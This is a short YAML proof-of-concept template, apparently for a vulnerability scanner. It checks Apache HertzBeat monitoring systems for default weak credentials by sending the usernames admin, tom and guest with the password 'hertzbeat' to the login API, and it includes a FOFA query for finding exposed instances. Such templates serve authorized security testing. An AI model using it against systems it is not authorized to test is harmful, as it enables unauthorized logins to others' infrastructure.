id: poc-yaml-apache-hertzbeat-weak-password
info:
  name: Apache HertzBeat开源实时监控系统 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: hertzbeat
  fofa: app="HertzBeat-实时监控系统"
variables:
  username: 'admin

    tom

    guest

    '
firstRequest:
  method: GET
  path: /
  expression: status_code == 200 && contains(title,"HertzBeat")
requests:
- method: POST
  path: /api/account/auth/form
  headers:
    Content-Type: application/json
  data: '{"type":0,"identifier":"{{.username}}","credential":"hertzbeat"}'
  expression: status_code == 200 && contains(body,"\"data\":") && contains(body,"\"token\":")
    && contains(body,"\"refreshToken\":") && contains(content_type,"application/json")
transport: http
